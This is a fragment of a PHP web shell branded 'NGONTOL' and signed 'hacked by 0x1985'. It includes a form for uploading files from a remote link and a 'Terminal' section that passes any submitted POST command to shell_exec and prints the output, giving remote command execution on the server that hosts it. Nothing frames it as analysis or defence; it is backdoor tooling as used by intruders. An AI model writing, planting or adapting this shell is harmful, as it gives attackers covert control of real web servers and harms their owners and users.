...
<center>
<font face="Bungee" size="5">NGONTOL</font></center>
...
function author() {
    echo "<center><br>salam booyah!</center>";
    exit();
}
...
<input type="text" name="darilink" class="up" placeholder="hacked by 0x1985">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";
...
// Terminal Section
echo '<div class="terminal-header">Terminal</div>';
echo '<div class="terminal-container">';

// Process command if submitted
if (isset($_POST['terminal_command']) && !empty($_POST['terminal_command'])) {
    $command = $_POST['terminal_command'];
    $output = shell_exec($command . ' 2>&1');
    echo '<div class="terminal-output"><span class="terminal-prompt">$ </span>' . htmlspecialchars($command) . '</div>';
    echo '<div class="terminal-output">' . htmlspecialchars($output) . '</div>';
}

// Terminal input form
echo '<form method="post" action="">';
echo '<div class="terminal-input-line">';
echo '<span class="terminal-prompt">$ </span>';
echo '<input type="text" name="terminal_command" class="terminal-input" autofocus autocomplete="off">';
echo '</div>';
echo '</form>';
echo '</div>';
